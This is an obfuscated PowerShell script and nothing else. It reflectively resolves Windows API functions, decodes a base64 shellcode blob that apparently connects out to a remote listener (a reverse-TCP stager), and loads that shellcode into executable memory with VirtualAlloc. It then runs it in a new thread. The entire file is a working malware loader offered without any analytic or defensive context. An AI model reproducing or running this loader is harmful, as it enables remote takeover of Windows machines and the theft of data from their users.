function mPDV {
	Param ($pYiy, $cG)		
	$sdEj = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $sdEj.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($sdEj.GetMethod('GetModuleHandle')).Invoke($null, @($pYiy)))), $cG))
}

function lZ {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $hn,
		[Parameter(Position = 1)] [Type] $rTTc0 = [Void]
	)
	
	$um_RJ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$um_RJ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hn).SetImplementationFlags('Runtime, Managed')
	$um_RJ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $rTTc0, $hn).SetImplementationFlags('Runtime, Managed')
	
	return $um_RJ.CreateType()
}

[Byte[]]$kD = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjBfLaZaAIAAiuJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=")
		
$g6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mPDV kernel32.dll VirtualAlloc), (lZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $kD.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($kD, 0, $g6, $kD.length)

$s_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mPDV kernel32.dll CreateThread), (lZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$g6,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mPDV kernel32.dll WaitForSingleObject), (lZ @([IntPtr], [Int32]))).Invoke($s_,0xffffffff) | Out-Null
